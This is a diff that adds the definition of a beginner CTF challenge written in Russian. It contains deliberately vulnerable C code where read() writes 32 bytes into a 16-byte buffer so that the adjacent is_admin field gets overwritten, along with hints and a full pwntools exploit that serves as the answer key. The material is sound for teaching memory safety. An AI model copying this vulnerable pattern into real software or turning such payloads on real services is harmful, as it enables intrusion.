@@ -1,0 +1,20 @@
+{
+  "kind": "pwn",
+  "title": "Права администратора",
+  "topic": "переполнение буфера, перезапись соседней переменной",
+  "difficulty": 1,
+  "statement": "Сервис пускает в админку только тех, у кого is_admin равен 0x1337. Сам он такого значения не ставит никогда. Получи флаг.",
+  "hints": [
+    "Где в памяти лежит is_admin относительно name?",
+    "Если записать в name больше 16 байт, следующие байты лягут в is_admin.",
+    "Структура: name[16], сразу за ним int is_admin. x86 — little-endian: 0x1337 в памяти — 37 13 00 00.",
+    "payload = b'A'*16 + p32(0x1337): 16 байт заполняют name, следующие 4 — is_admin."
+  ],
+  "source": "#include <stdio.h>\n#include <unistd.h>\n\nstruct user { char name[16]; int is_admin; };\n\nint main(void) {\n    struct user u = { .is_admin = 0 };\n    setvbuf(stdout, NULL, _IONBF, 0);\n    puts(\"Логин:\");\n    read(0, u.name, 32);\n    if (u.is_admin == 0x1337) {\n        char flag[64];\n        FILE *f = fopen(\"flag.txt\", \"r\");\n        if (f && fgets(flag, sizeof flag, f)) puts(flag);\n    } else {\n        printf(\"Привет, обычный пользователь. is_admin = 0x%x\\n\", u.is_admin);\n    }\n    return 0;\n}\n",
+  "cflags": [
+    "-fno-stack-protector",
+    "-O0"
+  ],
+  "exploit": "from pwn import *\ncontext.log_level = 'error'\np = process('./chal')\np.sendafter('Логин:\\n'.encode(), b'A' * 16 + p32(0x1337))\nprint(p.recvall(timeout=3).decode(errors='replace'))\n",
+  "give_source": true
+}
